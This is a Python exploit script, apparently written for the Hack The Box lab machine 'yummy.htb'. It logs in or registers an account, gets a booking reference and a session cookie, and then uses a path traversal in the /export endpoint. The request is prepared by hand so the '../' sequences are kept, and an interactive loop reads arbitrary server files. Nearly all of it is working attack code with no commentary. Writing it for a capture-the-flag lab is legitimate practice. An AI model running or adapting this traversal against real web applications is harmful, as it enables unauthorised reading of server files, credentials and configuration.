import os
import sys
import requests
import json
from bs4 import BeautifulSoup
from colorama import Fore, Style

base_url = "http://yummy.htb"

def authenticate(email, password):
	print(Fore.BLUE + f"[*] Authenticating..." + Style.RESET_ALL)

	token = login(email, password)
	if token == None:
		print(Fore.YELLOW + f"[!] Authentication failed. Attempting to register account." + Style.RESET_ALL)
		register(email, password)
		token = login(email, password)
		if token == None:
			print(Fore.RED + f"[-] Authentication failed again." + Style.RESET_ALL)
			exit(0)

	print(Fore.GREEN + f"[+] Authentication successful." + Style.RESET_ALL)
	return token

def login(email, password): #POST /login
	login_url = f"{base_url}/login"
	data = {
		"email": email,
		"password": password
	}

	try:
		r = requests.post(login_url, json=data)
	except requests.RequestException as e:
		print(Fore.RED + f"[-] Something went wrong." + Style.RESET_ALL)
		print(Fore.RED + f"[-] Error: {e}" + Style.RESET_ALL)
		exit(0)

	if r.status_code == 401:
		return None

	elif r.status_code == 200:
		token = json.loads(r.text)["access_token"]
		return token

	else:
		# should never happen
		print(Fore.RED + f"[-] Unknown error occurred." + Style.RESET_ALL)
		exit(0)

def register(email, password):
	register_url = f"{base_url}/register"
	data = {
		"email": email,
		"password": password
	}

	try:
		r = requests.post(register_url, json=data)
	except requests.RequestException as e:
		print(Fore.RED + f"[-] Something went wrong." + Style.RESET_ALL)
		print(Fore.RED + f"[-] Error: {e}" + Style.RESET_ALL)
		exit(0)

	if r.status_code == 400:
		print(Fore.RED + f"[-] Registration failed." + Style.RESET_ALL)
		print(Fore.RED + f"[-] Reason: {json.loads(r.text)['message']}" + Style.RESET_ALL)
		exit(0)

	elif r.status_code == 201:
		print(Fore.GREEN + "[+] Registration successful." + Style.RESET_ALL)
		return True

	else:
		# should never happen
		print(Fore.RED + f"[-] Unknown error occurred." + Style.RESET_ALL)
		exit(0)

def get_ref(token, email):
	ref = find_ref(token)

	if ref == -1:
		print(Fore.YELLOW + f"[!] No booking reference found. Attempting to make a booking." + Style.RESET_ALL)
		book(token, email)
		ref = find_ref(token)
		if ref == -1:
			print(Fore.RED + f"[-] No booking reference found again." + Style.RESET_ALL)
			exit(0)

	print(Fore.GREEN + f"[+] Booking reference found: {ref}." + Style.RESET_ALL)
	return ref

def find_ref(token):
	dashboard_url = f"{base_url}/dashboard"
	cookies = {"X-AUTH-Token": token}

	try:
		r = requests.get(dashboard_url, cookies=cookies, allow_redirects=False)
	except requests.RequestException as e:
		print(Fore.RED + f"[-] Something went wrong." + Style.RESET_ALL)
		print(Fore.RED + f"[-] Error: {e}" + Style.RESET_ALL)
		exit(0)

	if r.status_code == 302:
		print(Fore.RED + f"[-] Session expired." + Style.RESET_ALL)
		exit(0)

	soup = BeautifulSoup(r.text, 'html.parser')
	links = soup.find_all("a", class_="book-a-table-btn")
	
	if len(links) < 2:
		return -1

	ref = int(links[2]["href"][10:])
	return ref

def book(token, email):
	book_url = f"{base_url}/book"
	cookies = {"X-AUTH-Token": token}
	data = {
		"name": "John Doe",
		"email": email,
		"phone": "1234567890",
		"date": "2025-12-31",
		"time": "23:59",
		"people": "10",
		"message": "bookings"
	}

	try:
		r = requests.post(book_url, cookies=cookies, data=data)
	except requests.RequestException as e:
		print(Fore.RED + f"[-] Something went wrong." + Style.RESET_ALL)
		print(Fore.RED + f"[-] Error: {e}" + Style.RESET_ALL)
		exit(0)

	if r.status_code == 400:
		print(Fore.RED + f"[-] Unknown error occurred." + Style.RESET_ALL)
		exit(0)

	print(Fore.GREEN + f"[+] Booking made." + Style.RESET_ALL)
	return

def file_read(token, ref, path, email, password):
	session = get_session(token, ref)
	if session == None:
		print(Fore.RED + f"[-] Session expired." + Style.RESET_ALL)
		exit(0)

	export_url = f"{base_url}/export/../../../../../..{path}"
	cookies = {
		"X-AUTH-Token": token,
		"session": session
	}

	try:
		# Ref: https://github.com/psf/requests/issues/5289
		s = requests.Session()
		req = requests.Request(method='GET', url=export_url, cookies=cookies)
		p = req.prepare()
		p.url = export_url
		r = s.send(p, verify=False)
	except requests.RequestException as e:
		print(Fore.RED + f"[-] Something went wrong." + Style.RESET_ALL)
		print(Fore.RED + f"[-] Error: {e}" + Style.RESET_ALL)
		exit(0)

	if r.status_code == 200:
		print(Fore.GREEN + f"File read successful:" + Style.RESET_ALL)
		print(r.text)
	elif r.status_code == 404:
		print(Fore.YELLOW + f"[!] File not found." + Style.RESET_ALL)
	else:
		print(Fore.YELLOW + f"[!] Failed to read file." + Style.RESET_ALL)
		print(Fore.YELLOW + f"[!] Status code: {r.status_code}" + Style.RESET_ALL)
	
	print()
	return

def get_session(token, ref):
	sess_url = f"{base_url}/reminder/{ref}"
	cookies = {"X-AUTH-Token": token}

	try:
		r = requests.get(sess_url, cookies=cookies, allow_redirects=False)
	except requests.RequestException as e:
		print(Fore.RED + f"[-] Something went wrong." + Style.RESET_ALL)
		print(Fore.RED + f"[-] Error: {e}" + Style.RESET_ALL)
		exit(0)

	headers = dict(r.headers)
	if 'Set-Cookie' in headers:
		session = headers['Set-Cookie'].split('=')[1].split(';')[0]
		return session
	else:
		return None

def main():
	if (len(sys.argv) != 3):
		print(Fore.RED + f"[-] Usage: python {sys.argv[0]} <email> <password>")
		exit(0)

	email = sys.argv[1]
	password = sys.argv[2]

	# login
	token = authenticate(email, password)

	# find booking reference(book-a-table-btn a href)
	ref = get_ref(token, email)

	# file read (while loop)
	while True:
		print(Fore.BLUE + f"[*] Full path of file to read: (enter 'exit' to quit)" + Style.RESET_ALL)
		path = input(Fore.BLUE + ">> " + Style.RESET_ALL)
		if (path == "exit"):
			print(Fore.RED + f"[-] Exiting..." + Style.RESET_ALL)
			exit(0)

		file_read(token, ref, path, email, password)

if __name__ == "__main__":
	main()